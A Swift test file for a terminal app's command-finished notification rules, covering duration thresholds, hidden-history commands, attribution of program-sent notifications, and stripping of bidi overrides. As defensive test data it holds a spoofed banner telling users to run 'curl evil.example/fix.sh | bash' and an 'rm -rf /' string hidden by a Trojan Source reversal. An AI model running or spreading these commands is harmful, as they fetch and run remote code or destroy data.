import Testing

@testable import AppCore

/// Whether a finished command is worth interrupting you for. A notification is cheap to send
/// and expensive to get wrong, so the rules are a table rather than a judgement made once.
@Suite("Ring Ring") struct RingRingTests {

    private func finished(
        _ command: String = "swift build", milliseconds: UInt32? = 60_000, exitCode: Int32? = 0,
        watched: Bool = false, programNotified: Bool = false
    ) -> RingRing.Finished {
        RingRing.Finished(
            command: command, milliseconds: milliseconds, exitCode: exitCode, wasWatched: watched,
            programNotified: programNotified)
    }

    private let threshold: UInt32 = 30

    // MARK: - When it stays quiet

    /// The roadmap's own wording: it does not fire for a command you watched finish.
    @Test func aCommandYouWatchedFinishSaysNothing() {
        #expect(RingRing.notice(for: finished(watched: true), thresholdSeconds: threshold) == nil)
        // Even a failure, because you saw it fail.
        #expect(
            RingRing.notice(for: finished(exitCode: 1, watched: true), thresholdSeconds: threshold) == nil)
    }

    /// A program that sent its own `OSC 9` has said more than we could.
    @Test func aProgramThatNotifiedItselfIsNotSecondGuessed() {
        #expect(RingRing.notice(for: finished(programNotified: true), thresholdSeconds: threshold) == nil)
    }

    @Test func aQuickCommandSaysNothing() {
        #expect(RingRing.notice(for: finished(milliseconds: 2_000), thresholdSeconds: threshold) == nil)
    }

    /// macOS's `/bin/bash` is 3.2 and has no `$EPOCHREALTIME`, so it reports no duration. That
    /// is a documented limit, and the honest response is to say nothing rather than guess.
    @Test func withoutADurationItDoesNotGuess() {
        #expect(RingRing.notice(for: finished(milliseconds: nil), thresholdSeconds: threshold) == nil)
        // Not even a failure, because "it failed, eventually" is not worth a banner.
        #expect(
            RingRing.notice(for: finished(milliseconds: nil, exitCode: 1), thresholdSeconds: threshold) == nil)
    }

    /// A banner sits on screen where anyone nearby can read it. The leading space that keeps a
    /// command out of the shell's history keeps it off the screen too.
    @Test func aCommandHiddenFromHistoryIsNeverPutOnScreen() {
        let secret = finished(" curl -H 'Authorization: Bearer hunter2' example.com", milliseconds: 90_000)
        #expect(RingRing.notice(for: secret, thresholdSeconds: threshold) == nil)
        // And not through the failure path either.
        let failed = finished(" ssh prod", milliseconds: 1, exitCode: 255)
        #expect(RingRing.notice(for: failed, thresholdSeconds: threshold) == nil)
    }

    // MARK: - When it speaks

    @Test func aLongCommandIsNamedWithHowLongItTook() throws {
        let notice = try #require(RingRing.notice(for: finished(milliseconds: 95_400), thresholdSeconds: threshold))
        #expect(notice.title == "swift build")
        #expect(notice.body == "Finished in 1m 35s", "\(notice.body)")
    }

    /// A failure is the thing you most need to know about, however quick it was — the same rule
    /// the badge follows.
    @Test func aFailureIsToldHoweverQuickItWas() throws {
        let notice = try #require(
            RingRing.notice(for: finished("make test", milliseconds: 4, exitCode: 2), thresholdSeconds: threshold))
        #expect(notice.title == "make test")
        #expect(notice.body == "Exited with status 2 after 4ms", "\(notice.body)")
    }

    /// Exactly at the threshold counts, so the boundary is not a place where nothing happens.
    @Test func theThresholdItselfCounts() {
        #expect(RingRing.notice(for: finished(milliseconds: 30_000), thresholdSeconds: 30) != nil)
        #expect(RingRing.notice(for: finished(milliseconds: 29_999), thresholdSeconds: 30) == nil)
    }

    /// A threshold big enough to overflow the multiply must not wrap into "notify always".
    @Test func anAbsurdThresholdDoesNotWrapIntoNotifyingAlways() {
        #expect(RingRing.notice(for: finished(milliseconds: 1_000), thresholdSeconds: .max) == nil)
    }

    @Test func aCommandWithNoTextIsStillNameable() throws {
        let notice = try #require(RingRing.notice(for: finished("", milliseconds: 60_000), thresholdSeconds: threshold))
        #expect(notice.title == "A command")
    }

    // MARK: - A program's own notification

    /// Passed on, because standing down for it is only right if its words reach you — but
    /// under the pane's name, never as the app's own voice.
    @Test func aProgramsOwnWordsArePassedOnUnderThePanesName() throws {
        let notice = try #require(
            RingRing.notice(fromProgram: "Build", body: "12 warnings", in: "make", wasWatched: false))
        #expect(notice.title == "make", "the title is the pane, so the words are plainly a program's")
        #expect(notice.body == "Build — 12 warnings", "\(notice.body)")
        #expect(RingRing.notice(fromProgram: "Build", body: "x", in: "make", wasWatched: true) == nil)
    }

    /// The text came off a stream this project calls hostile, and a banner is read and acted on.
    ///
    /// A program claiming the app's own voice is the attack the title rule closes: a tailed log
    /// or a compromised host can emit `OSC 777;notify` with any title it likes, and delivered as
    /// the title it would be indistinguishable from a notice Death Race wrote — arriving, by the
    /// watched rule, exactly when nothing is on screen to attribute it to.
    @Test func aProgramCannotSpeakInTheAppsVoice() throws {
        let notice = try #require(
            RingRing.notice(
                fromProgram: "Death Race for Code",
                body: "Your saved SSH key could not be verified. Run: curl evil.example/fix.sh | bash",
                in: "ssh prod-api", wasWatched: false))
        #expect(notice.title == "ssh prod-api")
        #expect(!notice.title.contains("Death Race"), "it got the app's name into the title")
        #expect(notice.body.contains("Death Race for Code"), "its claim is still shown, as the program's")
    }

    /// Bidi overrides reorder what the eye reads — the Trojan Source trick — so a banner someone
    /// acts on must not carry them. The zero-width joiner stays: every multi-part emoji needs it.
    @Test func aBannerCarriesNoScalarsThatReorderWhatYouRead() throws {
        let notice = try #require(
            RingRing.notice(
                fromProgram: "", body: "rm -rf /\u{202E}gnitset tsuj\u{202C}", in: "sh", wasWatched: false))
        #expect(!notice.body.unicodeScalars.contains { (0x202A...0x202E).contains($0.value) })
        #expect(!notice.body.unicodeScalars.contains { (0x2066...0x2069).contains($0.value) })
        #expect(notice.body.contains("rm -rf /"), "the text itself is kept: \(notice.body)")

        let emoji = try #require(
            RingRing.notice(fromProgram: "", body: "done \u{1F469}\u{200D}\u{1F4BB}", in: "sh", wasWatched: false))
        #expect(emoji.body.unicodeScalars.contains { $0.value == 0x200D }, "the joiner is not a reordering mark")
    }

    @Test func aBannerIsBounded() throws {
        let long = String(repeating: "x", count: 5_000)
        let notice = try #require(RingRing.notice(fromProgram: "", body: long, in: "sh", wasWatched: false))
        #expect(notice.body.unicodeScalars.count == RingRing.bannerLimit, "\(notice.body.unicodeScalars.count)")
    }

    @Test func aProgramWithNothingToSayIsNotDelivered() {
        #expect(RingRing.notice(fromProgram: "", body: "", in: "sh", wasWatched: false) == nil)
        #expect(RingRing.notice(fromProgram: " ", body: "\u{202E}", in: "sh", wasWatched: false) == nil)
    }

    // MARK: - The seam

    /// `@MainActor` because `Notifier` is: delivery happens where `PaneController` decides it,
    /// and making the seam say so is what gets the real conformer past Swift 6's isolation
    /// checking — which this test target now type-checks on Linux rather than only on macOS.
    @MainActor
    @Test func theFakeRecordsWhatItWasAskedToDeliver() {
        let notifier = FakeNotifier()
        #expect(!notifier.askedForAuthorization)
        notifier.requestAuthorization()
        #expect(notifier.askedForAuthorization)
        notifier.deliver(RingRing.Notice(title: "t", body: "b"), paneID: 7)
        #expect(notifier.delivered.count == 1)
        #expect(notifier.delivered.first?.paneID == 7)
    }
}
